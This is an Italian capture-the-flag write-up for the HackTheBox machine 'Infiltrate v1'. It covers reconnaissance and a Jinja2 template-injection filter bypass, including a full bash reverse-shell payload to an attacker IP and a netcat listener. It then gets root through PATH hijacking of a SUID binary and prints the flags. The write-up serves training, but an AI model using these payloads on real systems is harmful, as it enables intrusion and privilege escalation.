---
title: "HackTheBox - Infiltrate v1 (Web / Linux)"
description: "Writeup completo per la box Infiltrate v1: SSTI Flask bypass e SUID binary path injection."
---

# HackTheBox: Infiltrate v1

<p>
  <span class="terminal-badge yellow">Difficulty: Medium</span>
  <span class="terminal-badge blue">OS: Linux</span>
  <span class="terminal-badge">Tags: Flask, SSTI, Filter Bypass, SUID</span>
</p>

- **Target IP:** `10.10.11.234`
- **Piattaforma:** HackTheBox
- **Macchina:** Linux x86_64

---

## [+] Reconnaissance

Iniziamo con la scansione di tutte le porte TCP aperte sul target per identificare la superficie d'attacco esposta:

```bash
sudo nmap -sC -sV -p- -T4 --min-rate 1000 10.10.11.234 -oN scans/nmap_full.txt
```

Risultato dello scan Nmap:

```text
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.10.11.234
Host is up (0.045s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 71:4b:d1:2a:6d:31:0c:4e:30:11:00:2b:4d:52:e3:19 (ECDSA)
|_  256 12:8e:28:9f:22:90:7b:35:bc:41:82:1c:10:9a:12:44 (ED25519)
8080/tcp open  http    Werkzeug httpd 2.2.2 (Python 3.10.6)
|_http-title: Infiltrate System Portal
|_http-server-header: Werkzeug/2.2.2 Python/3.10.6
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Dalla scansione rileviamo:
- **Porta 22 (SSH):** OpenSSH 8.9p1.
- **Porta 8080 (HTTP):** Server Werkzeug/Python (Flask).

---

## [+] Enumeration

Visitando `http://10.10.11.234:8080`, troviamo una web application per la generazione di report PDF denominata "Infiltrate System Portal".

Procediamo con il directory fuzzing tramite `ffuf`:

```bash
ffuf -u http://10.10.11.234:8080/FUZZ \
     -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
     -mc 200,301,302,403 -c
```

L'output rivela i seguenti endpoint:
- `/preview` (POST) - Elabora i template Jinja2 inviati nel parametro `report_name`.
- `/health` (GET) - Endpoint di monitoring.

Testando l'input riflesso in `/preview`:

```http
POST /preview HTTP/1.1
Host: 10.10.11.234:8080
Content-Type: application/x-www-form-urlencoded

report_name={{7*7}}
```

La risposta HTTP restituisce:
```html
<div class="result">Preview generated for: 49</div>
```

Il risultato `49` conferma la presenza di una vulnerabilità di tipo **Server-Side Template Injection (SSTI)** nel motore Jinja2.

Tuttavia, quando tentiamo payload standard come `{{config.__class__}}`, l'applicazione restituisce `403 Forbidden` indicando una blacklist regex:
- Caratteri bloccati: `_` (underscore), `.` (punto), `[` e `]`.

---

## [+] Exploitation

Per aggirare la blacklist di Jinja2 senza usare punti e underscore, utilizziamo la notazione con filtri `|attr()` combinata con la codifica esadecimale o stringhe formattate con parametri di query URL (`request.args`):

```http
POST /preview?c=__class__&m=__mro__&s=__subclasses__&cmd=id HTTP/1.1
Host: 10.10.11.234:8080
Content-Type: application/x-www-form-urlencoded

report_name={{request|attr(request.args.c)}}
```

Confermato il bypass, costruiamo il payload per invocare `os.popen()` o `subprocess.Popen` e ottenere una reverse shell.

1. Avviamo un listener Netcat sulla macchina Kali:
```bash
nc -lvnp 4444
```

2. Inviamo la richiesta contenente la reverse shell bash:
```http
POST /preview?a=__init__&b=__globals__&c=__builtins__&d=eval HTTP/1.1
Host: 10.10.11.234:8080
Content-Type: application/x-www-form-urlencoded

report_name={{()|attr(request.args.a)|attr(request.args.b)|attr(request.args.c)|attr(request.args.d)("__import__('os').system('bash -c \"bash -i >& /dev/tcp/10.10.14.5/4444 0>&1\"')")}}
```

Otteniamo immediatamente una shell sul nostro listener:

```bash
listening on [any] 4444 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.11.234] 52410
www-data@infiltrate:/app$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Stabilizziamo il terminale con Python PTY:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
```

---

## [+] Privilege Escalation

Enumerando i binari con permessi SUID presenti sul file system:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Tra i soliti noti, notiamo un file non standard:
```text
/usr/local/bin/sysreport
```

Analizziamo i dettagli e le stringhe del binario:

```bash
ls -la /usr/local/bin/sysreport
-rwsr-xr-x 1 root root 16824 Nov  2 09:30 /usr/local/bin/sysreport

strings /usr/local/bin/sysreport | grep -E "system|sh|bin"
```

Notiamo che il programma esegue una chiamata di sistema a un percorso relativo senza specificare il path assoluto:
```c
system("service status apache2");
```

Poiché il binario viene eseguito come `root` e non usa `/usr/sbin/service`, possiamo abusare della variabile d'ambiente `$PATH` (Path Hijacking).

1. Creiamo un falso script `service` nella cartella `/tmp`:
```bash
cat << 'EOF' > /tmp/service
#!/bin/bash
/bin/bash -p
EOF
chmod +x /tmp/service
```

2. Anteponiamo `/tmp` all'inizio della variabile `PATH` ed eseguiamo il binario:
```bash
export PATH=/tmp:$PATH
/usr/local/bin/sysreport
```

Otteniamo una shell di root con EUID 0!

```bash
root@infiltrate:/app# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
```

---

## [+] Flag

???+ success "User & Root Flag"
    ```text
    [+] User Flag: HTB{5st1_j1nj4_byp455_4lw4y5_w0rk5}
    [+] Root Flag: HTB{p4th_h1j4ck_su1d_r00t_0wn3d}
    ```
